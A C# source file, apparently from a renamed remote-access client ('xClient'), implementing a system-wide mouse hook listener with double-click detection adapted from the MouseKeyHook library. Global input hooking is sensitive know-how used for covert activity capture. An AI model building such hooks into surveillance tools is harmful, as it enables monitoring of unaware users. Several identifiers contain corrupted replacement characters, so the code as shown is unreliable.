// This code is distributed under MIT license. 
// Copyright (c) 2015 George Mamaladze
// See license.txt or http://opensource.org/licenses/mit-license.php

using System.Windows.Forms;
using xClient.Kuuhaku�ekirdek.MouseKeyHook.WinApi;

namespace xClient.Kuuhaku�ekirdek.MouseKeyHook.Implementation
{
    internal class GlobalMouseListener : MouseListener
    {
        private readonly int m_SystemDoubleClickTime;
        private MouseButtons m_PreviousClicked;
        private Point m_PreviousClickedPosition;
        private int m_PreviousClickedTime;

        public GlobalMouseListener()
            : base(HookHelper.HookGlobalMouse)
        {
            m_SystemDoubleClickTime = MouseNativeMethods.GetDoubleClickTime();
        }

        protected override void ProcessDown(ref EventArgsExtFare e)
        {
            if (IsDoubleClick(e))
            {
                e = e.ToDoubleClickEventArgs();
            }
            base.ProcessDown(ref e);
        }

        protected override void ProcessUp(ref EventArgsExtFare e)
        {
            base.ProcessUp(ref e);
            if (e.Clicks == 2)
            {
                StopDoubleClickWaiting();
            }

            if (e.Clicks == 1)
            {
                StartDoubleClickWaiting(e);
            }
        }

        private void StartDoubleClickWaiting(EventArgsExtFare e)
        {
            m_PreviousClicked = e.Button;
            m_PreviousClickedTime = e.ZamanDamgas�;
            m_PreviousClickedPosition = e.Point;
        }

        private void StopDoubleClickWaiting()
        {
            m_PreviousClicked = MouseButtons.None;
            m_PreviousClickedTime = 0;
            m_PreviousClickedPosition = new Point(0, 0);
        }

        private bool IsDoubleClick(EventArgsExtFare e)
        {
            return
                e.Button == m_PreviousClicked &&
                e.Point == m_PreviousClickedPosition && // Click-move-click exception, see Patch 11222
                e.ZamanDamgas� - m_PreviousClickedTime <= m_SystemDoubleClickTime;
        }

        protected override EventArgsExtFare GetEventArgs(CallbackData data)
        {
            return EventArgsExtFare.FromRawDataGlobal(data);
        }
    }
}